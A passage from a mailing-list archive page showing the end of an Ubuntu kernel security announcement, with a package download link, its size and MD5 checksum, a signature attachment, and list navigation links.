    <http://security.ubuntu.com/ubuntu/pool/main/l/linux-source-2.6.8.1/linux-image-2.6.8.1-5-powerpc_2.6.8.1-16.12_powerpc.deb>
  Size/MD5: 15975818 8ba319a47d693a063cfae316aaf965e8

[["signature.asc" (application/pgp-signature)]](?l=bugtraq&m=111091402626556&q=p3)

[[prev in list](?l=bugtraq&m=111091295805192&w=2)] [[next in list](?l=bugtraq&m=111091349210976&w=2)] [[prev in thread](?l=ubuntu-security-announce&m=139113797221668&w=2)] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


